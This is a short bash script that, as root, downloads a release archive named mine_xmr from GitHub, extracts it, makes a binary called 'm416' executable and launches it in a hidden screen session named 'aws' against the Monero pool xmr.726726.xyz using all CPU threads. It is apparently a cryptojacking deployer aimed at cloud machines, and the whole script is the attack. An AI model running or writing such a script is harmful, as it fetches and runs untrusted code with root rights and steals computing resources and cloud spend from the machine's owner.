#!/bin/bash
sudo -i <<EOF
wget https://github.com/yuqingkj/mine_xmr/releases/download/6.18.1/6.18.1.tar.gz
tar -xvf 6.18.1.tar.gz
cd 6.18.1/
chmod 777 ./m416
screen -dmS aws
screen -x -S aws -p 0 -X stuff "./m416 -o xmr.726726.xyz:3333 --rig-id aws -t $(nproc) \n"
echo ok
EOF
